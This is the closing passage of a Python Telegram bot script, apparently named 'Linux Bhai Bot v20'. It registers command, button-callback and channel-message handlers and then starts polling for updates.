    app.add_handler(CallbackQueryHandler(device_callback, pattern="^dev_"))
    app.add_handler(CallbackQueryHandler(sim_callback, pattern="^sim_"))
    app.add_handler(CallbackQueryHandler(check_membership_callback, pattern="^check_membership$"))
    app.add_handler(CallbackQueryHandler(back_to_devices, pattern="^back_to_devices$"))
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("devices", devices_command))
    app.add_handler(CommandHandler("resetforward", reset_forward))
    app.add_handler(CommandHandler("cancel", cancel_all))
    
    app.add_handler(MessageHandler(filters.TEXT & filters.ChatType.CHANNEL, handle_channel))
    
    logger.warning("⚡ LINUX BHAI BOT v20 STARTED ⚡")
    app.run_polling(
        allowed_updates=Update.ALL_TYPES,
        drop_pending_updates=True,
        pool_timeout=1,
    )

if __name__ == "__main__":
    main()